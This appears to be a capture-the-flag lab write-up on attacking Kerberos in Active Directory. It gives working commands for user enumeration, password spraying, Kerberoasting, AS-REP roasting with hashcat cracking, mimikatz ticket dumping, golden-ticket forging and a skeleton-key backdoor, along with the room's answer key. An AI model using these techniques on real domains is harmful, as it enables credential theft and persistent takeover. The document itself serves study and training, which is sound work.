# Attacking Kerberos - Easy

1. [Introduction](#introduction)
2. [Enumeration with Kerbrute](#enumeration-with-kerbrute)
3. [Harvesting & Brute-Forcing Tickets with Rubeus](#harvesting--brute-forcing-tickets-with-rubeus)
4. [Kerberoasting with Rubeus & Impacket](#kerberoasting-with-rubeus--impacket)
5. [AS-REP Roasting with Rubeus](#as-rep-roasting-with-rubeus)
6. [Pass the Ticket with mimikatz](#pass-the-ticket-with-mimikatz)
7. [Golden/Silver Ticket Attacks with mimikatz](#goldensilver-ticket-attacks-with-mimikatz)
8. [Kerberos Backdoors with mimikatz](#kerberos-backdoors-with-mimikatz)

## Introduction

* Kerberos is the default authentication service for Microsoft Windows domains.

* For Kerbrute Enumeration, we do not require domain access.

```markdown
1. What does TGT stand for? - Ticket Granting Ticket

2. What does SPN stand for? - Service Principal Name

3. What does PAC stand for? - Privilege Attribute Certificate

4. What two services make up the KDC? - AS, TGS
```

## Enumeration with Kerbrute

* Kerbrute is an enumeration tool used to brute-force and enumerate valid AD (Active Directory) users by abusing Kerberos pre-authentication.

```shell
sudo vim /etc/hosts
#add 10.10.242.168 CONTROLLER.local to /etc/hosts

cd ~/Tools/

./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local ~/Downloads/User.txt
#Kerbrute enumeration
#--dc and -d for location of domain controller
#the usernames are in the form of name@CONTROLLER.local
```

```markdown
1. How many total users do we enumerate? - 10

2. What is the SQL service account name? - sqlservice

3. What is the second "machine" account name? - machine2

4. What is the third "user" account name? - user3
```

## Harvesting & Brute-Forcing Tickets with Rubeus

* Rubeus is a tool used for attacking Kerberos.

```shell
#rubeus is in the target machine
#so we need to ssh to target machine
ssh Administrator@10.10.242.168

cd Downloads

dir

Rubeus.exe harvest /interval:30
#harvest for TGTs every 30 seconds

#we can use Rubeus for brute-forcing and password-spraying as well

echo 10.10.242.168 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
#add domain controller domain name to Windows hosts file

Rubeus.exe brute /password:Password1 /noticket
#sprays password against all found users and gives .kirbi TGT for that user
```

```markdown
1. Which domain admin do we get a ticket for when harvesting tickets? - Administrator

2. Which domain controller do we get a ticket for when harvesting tickets? - CONTROLLER-1
```

## Kerberoasting with Rubeus & Impacket

* Kerberoasting attack allows user to request a service ticket for any service with a registered SPN, then use that ticket to crack the service password.

* Furthermore, we can use a tool like BloodHound to find Kerberoastable accounts.

```shell
#Kerberoasting with Rubeus

Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
#dumps Kerberos hash of any Kerberoastable users
#copy both hashes to attacker machine and crack with hashcat
```

```shell
#Kerberoasting with Impacket
#this can be done remotely
cd /usr/share/doc/python3-impacket/examples

sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.242.168 -request
#dump Kerberos hashes
```

```shell
#cracking with hashcat in attacker machine
hashcat -m 13100 -a 0 sqlhash.txt Pass.txt

hashcat -m 13100 -a 0 httphash.txt Pass.txt
```

```markdown
1. What is the HTTPService Password? - Summer2020

2. What is the SQLService Password? - MYPassword123#
```

## AS-REP Roasting with Rubeus

* AS-REP Roasting dumps krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.

```shell
#in target machine
Rubeus.exe asreproast
#dumps hashes
#copy hashes to attacker machine
```

```shell
#in attacker machine
hashcat -m 18200 --example-hashes

#we need to insert 23$ after $krb5asrep$ in the hashes

hashcat -m 18200 Admin2hash.txt Pass.txt

hashcat -m 18200 User3hash.txt Pass.txt
```

```markdown
1. What hash type does AS-REP Roasting use? - Kerberos 5, etype 23, AS-REP

2. Which user is vulnerable to AS-REP Roasting? - User3

3. What is the user's password? - Password3

4. Which admin is vulnerable to AS-REP Roasting? - Admin2

5. What is the admin's password? - P@$$W0rd2
```

## Pass the Ticket with mimikatz

* ```mimikatz``` is a post-exploitation tool used for dumping user credentials inside of an AD network.

* Here we can use it to dump a TGT from LSASS memory.

```shell
mimikatz.exe

privilege::debug

sekurlsa::tickets /export
#exports all .kirbi tickets into current directory

#pass the ticket using mimikatz

kerberos::ptt <ticketfile>
#cache and impersonate given ticket

#quit mimikatz

klist
#lists cached tickets
```

## Golden/Silver Ticket Attacks with mimikatz

* A silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

* A KRBTGT is the service account for the KDC (Key Distribution Center).

* A TGT is a ticket to a service account issued by the KDC.

```shell
mimikatz.exe

privilege::debug

lsadump::lsa /inject /name:krbtgt
#dumps krbtgt hash

lsadump::lsa /inject /name:sqlservice
#dumps sqlservice hash

lsadump::lsa /inject /name:administrator
#dumps administrator hash

kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:1103
#create golden ticket

misc::cmd
#open elevated command prompt with given ticket
#this attack requires other machines on the domain to work
```

```markdown
1. What is the SQLService NTLM Hash? - cd40c9ed96265531b21fc5b1dafcfb0a

2. What is the Administrator NTLM Hash? - 2777b7fec870e04dda00cd7260f7bee6
```

## Kerberos Backdoors with mimikatz

* Kerberos backdoor works by implanting a skeleton key which abuses the AS-REQ timestamp encryption (only works for Kerberos RC4 encryption).

```shell
mimikatz.exe

privilege::debug

misc::skeleton
#now we can access the network using default cred 'mimikatz'
```
